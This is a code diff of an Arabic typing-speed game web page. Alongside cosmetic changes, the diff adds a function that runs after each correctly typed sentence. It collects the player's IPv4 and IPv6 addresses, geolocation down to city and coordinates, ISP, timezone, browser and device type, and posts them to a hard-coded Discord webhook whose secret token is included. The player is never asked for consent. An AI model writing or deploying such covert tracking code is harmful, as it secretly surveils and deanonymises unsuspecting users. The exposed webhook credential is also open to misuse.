@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>اختبر سرعتك</title>
+  <title>اختبر سرعتك مع جمع معلومات الجهاز</title>
   <style>
     body {
       margin: 0; padding: 0;
@@ -59,12 +59,14 @@
       letter-spacing: 0.02em;
       line-height: 1.4;
       user-select: none;
+      white-space: normal;
     }
     #sentence span {
       padding: 0 4px;
       border-radius: 4px;
       cursor: default;
       display: inline-block;
+      margin: 0 2px;
     }
     #sentence span.correct {
       color: #4caf50;
@@ -135,9 +137,10 @@
       padding: 15px;
       font-size: 14px;
       z-index: 1100;
-      width: 220px;
+      width: 240px;
       box-shadow: 0 0 10px rgba(255,255,255,0.3);
       text-align: right;
+      user-select: none;
     }
     #closeBtn {
       background: #c62828;
@@ -164,6 +167,19 @@
       font-size: 14px;
       color: #777;
       user-select: none;
+    }
+    #infoBox {
+      margin-top: 15px;
+      font-size: 16px;
+      background: rgba(30,30,30,0.7);
+      padding: 15px;
+      border-radius: 8px;
+      text-align: right;
+      direction: rtl;
+      max-height: 200px;
+      overflow-y: auto;
+      user-select: text;
+      white-space: pre-line;
     }
   </style>
 </head>
@@ -202,6 +218,7 @@
   <div id="speedDisplay"></div>
   <div id="bestTime"></div>
   <div id="result"></div>
+  <div id="infoBox"></div>
 </div>
 
 <div id="footerRights">حقوق © معاذ الحربي</div>
@@ -256,103 +273,77 @@
   const welcomeMsg = document.getElementById("welcomeMsg");
   const sentence = document.getElementById("sentence");
   const userInput = document.getElementById("userInput");
-  const result = document.getElementById("result");
-  const record = document.getElementById("record");
   const speedDisplay = document.getElementById("speedDisplay");
   const bestTimeDisplay = document.getElementById("bestTime");
-  const music = document.getElementById("bgMusic");
+  const result = document.getElementById("result");
+  const record = document.getElementById("record");
   const musicControl = document.getElementById("musicControl");
   const discordBtn = document.getElementById("discordButton");
   const rightsMenu = document.getElementById("rightsMenu");
   const closeBtn = document.getElementById("closeBtn");
+  const infoBox = document.getElementById("infoBox");
+  const music = document.getElementById("bgMusic");
 
   let player = "";
   let currentSentence = "";
   let startTime = 0;
-  let highestSpeed = 0;
   let bestTime = null;
+  let highestSpeed = 0;
 
-  // جمل للكتابة
   const sentences = [
-    "ابدأ الآن",
-    "سر النجاح الاستمرار",
-    "لا تستسلم",
-    "ركز جيداً",
-    "الحياة تعلمنا دروسا كثيرة",
-    "اجعل وقتك مفيدا",
-    "التحدي يصنع الفارق",
-    "تعلم شيء جديد كل يوم"
+    "تعلم كل يوم شيء جديد",
+    "الكتابة السريعة مهارة رائعة",
+    "هل أنت جاهز؟",
+    "سرعتك في الكتابة مهمة",
+    "اختبر نفسك الآن",
+    "استمر في التدريب",
+    "حاول تحسين مستواك"
   ];
 
-  // زر ديسكورد لإظهار الحقوق
-  discordBtn.addEventListener("click", (e) => {
-    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
-    e.stopPropagation();
-  });
-  closeBtn.addEventListener("click", () => rightsMenu.style.display = "none");
-  document.addEventListener("click", (e) => {
-    if (!rightsMenu.contains(e.target) && !discordBtn.contains(e.target)) {
-      rightsMenu.style.display = "none";
-    }
-  });
-
-  // التحكم بالموسيقى
-  musicControl.addEventListener("click", () => {
-    if (music.paused) {
-      music.play();
-      musicControl.textContent = "🎵";
-    } else {
-      music.pause();
-      musicControl.textContent = "🔇";
-    }
-  });
-
-  // بدء اللعبة
+  // بداية اللعبة
   function startGame() {
-    player = playerName.value.trim();
-    if (!player) {
-      alert("اكتب اسمك أولاً");
+    if (!playerName.value.trim()) {
+      alert("اكتب اسمك من فضلك");
       return;
     }
-    welcomeMsg.textContent = `هلا بك، ${player}`;
+    player = playerName.value.trim();
+    welcomeMsg.textContent = `مرحبًا، ${player}! ابدأ بالكتابة`;
     loginScreen.style.display = "none";
     gameScreen.style.display = "block";
     newSentence();
-    userInput.value = "";
+    startTime = Date.now();
     userInput.focus();
     speedDisplay.textContent = "";
     bestTimeDisplay.textContent = bestTime ? `أفضل زمن: ${bestTime.toFixed(2)} ثانية` : "";
     result.textContent = "";
-    startTime = Date.now();
+    infoBox.textContent = "";
   }
 
-  // اختيار جملة جديدة عشوائية
-  function newSentence() {
-    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
-    renderSentence("");
-  }
-
-  // تلوين الجملة حسب الكتابة
+  // تلوين الكلمات كلمة كلمة
   function renderSentence(input) {
     sentence.innerHTML = "";
-    for (let i = 0; i < currentSentence.length; i++) {
-      const char = currentSentence[i];
-      const span = document.createElement("span");
-      span.textContent = char;
-      if (input[i] == null) {
+    let inputWords = input.trim().split(" ");
+    let targetWords = currentSentence.split(" ");
+
+    for (let i = 0; i < targetWords.length; i++) {
+      let span = document.createElement("span");
+      span.textContent = targetWords[i];
+      span.style.margin = "0 1px";
+      if (inputWords[i] == null) {
         span.className = "pending";
-      } else if (input[i] === char) {
+      } else if (inputWords[i] === targetWords[i]) {
         span.className = "correct";
       } else {
         span.className = "incorrect";
       }
       sentence.appendChild(span);
+      if (i !== targetWords.length - 1) sentence.appendChild(document.createTextNode(" "));
     }
   }
 
-  // تحقق من النص عند الضغط على الزر أو Enter
+  // التحقق من النص المكتوب
   function checkInput() {
-    const text = userInput.value;
+    const text = userInput.value.trim();
     if (text === currentSentence) {
       const endTime = Date.now();
       const elapsed = (endTime - startTime) / 1000;
@@ -370,18 +361,102 @@
       newSentence();
       userInput.value = "";
       startTime = Date.now();
+      infoBox.textContent = "";
+      sendUserInfo();
     } else {
       result.textContent = "حاول مرة أخرى";
+      infoBox.textContent = "";
     }
   }
 
-  // التعامل مع الضغط على Enter
+  // جملة جديدة عشوائية
+  function newSentence() {
+    currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
+    renderSentence("");
+  }
+
+  // التعامل مع زر Enter
   function handleEnter(e) {
     if (e.key === "Enter") {
       checkInput();
     }
   }
-</script>
 
+  // تحكم الموسيقى
+  musicControl.addEventListener("click", () => {
+    if (music.paused) {
+      music.play();
+      musicControl.textContent = "🔇";
+    } else {
+      music.pause();
+      musicControl.textContent = "🎵";
+    }
+  });
+
+  // أزرار الديسكورد والحقوق
+  discordBtn.onclick = () => {
+    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
+  };
+  closeBtn.onclick = () => {
+    rightsMenu.style.display = "none";
+  };
+
+  // إرسال معلومات المستخدم عبر الويب هوك
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";
+
+  async function sendUserInfo() {
+    try {
+      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
+        fetch('https://api.ipify.org?format=json'),
+        fetch('https://api64.ipify.org?format=json'),
+        fetch('https://ipapi.co/json/')
+      ]);
+      const ipv4Data = await ipv4Res.json();
+      const ipv6Data = await ipv6Res.json();
+      const geoData = await geoRes.json();
+
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const now = new Date();
+      const timeString = now.toISOString();
+      const ipv4 = ipv4Data.ip;
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+
+      // نوع الجهاز
+      let deviceType = "كمبيوتر";
+      if (/android|iphone|ipad|ipod/i.test(ua)) {
+        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
+      }
+
+      // نص المعلومات المرسل
+      const infoText = `
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+نوع الجهاز: ${deviceType}
+المتصفح: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+      `.trim();
+
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: infoText })
+      });
+
+      // عرض المعلومات داخل اللعبة (اختياري)
+      infoBox.textContent = infoText;
+    } catch (e) {
+      console.error('خطأ في إرسال معلومات المستخدم', e);
+    }
+  }
+</script>
 </body>
 </html>
